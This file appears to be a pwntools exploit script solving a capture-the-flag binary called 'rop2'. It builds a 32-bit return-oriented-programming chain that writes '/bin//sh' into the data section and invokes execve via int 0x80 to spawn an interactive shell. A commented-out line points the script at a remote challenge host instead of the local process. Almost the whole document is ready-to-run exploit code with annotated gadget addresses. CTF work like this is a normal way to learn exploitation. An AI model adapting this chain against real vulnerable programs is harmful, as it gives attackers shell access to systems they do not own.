from pwn import *

#p = process(['/usr/bin/nc', '45.122.249.68', '10006'])
p = process('./rop2')

# pop eax ; ret
pop_eax_ret = 0x080a8e36
# pop edx ; pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx_ret = 0x0806ee91
# systemcall
int_0x80 = 0x08049563
# pop edx ; ret
pop_edx_ret = 0x0806ee6b
# xor eax, eax ; ret
xor_eax_ret = 0x08056420
# mov dword ptr [edx], eax ; ret
mov_eax_mem_edx_ret = 0x08056e65
# address of binsh (data section)
binsh = 0x080da060

# padding
payload = b'A'*28

# add "/bin" into data section
# point edx to the start of data section
payload += p32(pop_edx_ret); payload += p32(binsh)
# put "/bin" in eax (e*x registers can contain 4 bytes)
payload += p32(pop_eax_ret); payload += b"/bin"
# move eax value to the memory where edx point (start of .bss section)
payload += p32(mov_eax_mem_edx_ret)
# point edx to next 4 bytes in order to insert "/sh" string
payload += p32(pop_edx_ret); payload += p32(binsh + 4)
# insert "//sh" into eax (4 bytes, shell accepts /bin//sh)
payload += p32(pop_eax_ret); payload += b'//sh'
# insert "//sh" into memory after string "/bin"
payload += p32(mov_eax_mem_edx_ret)
# point edx to next 4 byte (to insert null terminated after string "/bin//sh")
payload += p32(pop_edx_ret); payload += p32(binsh + 8)
# xor eax eax to make eax = 0 (null)
payload += p32(xor_eax_ret)
# move null byte to after "/bin/sh "
payload += p32(mov_eax_mem_edx_ret)

payload += p32(pop_eax_ret)
payload += p32(0xb)
payload += p32(pop_edx_ecx_ebx_ret)
payload += p32(0)
payload += p32(0)
payload += p32(binsh)
payload += p32(int_0x80)

# send payload to process
p.sendline(payload)
# interact with process
p.interactive()

#print(payload)
